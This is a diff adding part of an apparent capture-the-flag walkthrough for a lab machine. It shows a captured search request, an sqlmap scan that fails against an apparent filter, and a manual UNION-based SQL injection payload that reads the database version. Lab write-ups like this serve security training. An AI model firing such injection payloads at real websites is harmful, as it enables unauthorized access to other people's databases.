@@ -113,6 +113,81 @@ Starting gobuster in directory enumeration mode
 
 navingating to /search.php discloses a database of movies.
 
+```
+ cat search.txt
+POST /search.php HTTP/2
+Host: watch.streamio.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Origin: https://watch.streamio.htb
+Referer: https://watch.streamio.htb/search.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+q=test
+
+```
+
+```
+sqlmap -r search.txt --schema --force-ssl
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
+|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:44:02 /2026-10-01/
+
+[13:44:02] [INFO] parsing HTTP request from 'search.txt'
+[13:44:02] [INFO] testing connection to the target URL
+[13:44:08] [INFO] testing if the target URL content is stable
+[13:44:08] [INFO] target URL content is stable
+[13:44:08] [INFO] testing if POST parameter 'q' is dynamic
+[13:44:08] [INFO] POST parameter 'q' appears to be dynamic
+[13:44:08] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
+[13:44:08] [INFO] testing for SQL injection on POST parameter 'q'
+[13:44:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+got a 302 redirect to 'https://watch.streamio.htb/blocked.php'. Do you want to follow? [Y/n] n
+[13:44:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[13:44:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:44:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[13:44:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[13:44:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[13:44:16] [INFO] testing 'Generic inline queries'
+[13:44:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[13:44:17] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[13:44:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[13:44:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:44:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[13:44:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[13:44:21] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
+[13:44:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[13:44:34] [WARNING] POST parameter 'q' does not seem to be injectable
+[13:44:34] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[13:44:34] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 13:44:34 /2026-10-01/
+
+
+```
+
+```
+' UNION SELECT 1,@@version,3,4,5,6-- 
+```
+
 ---
 ## Foothold
 
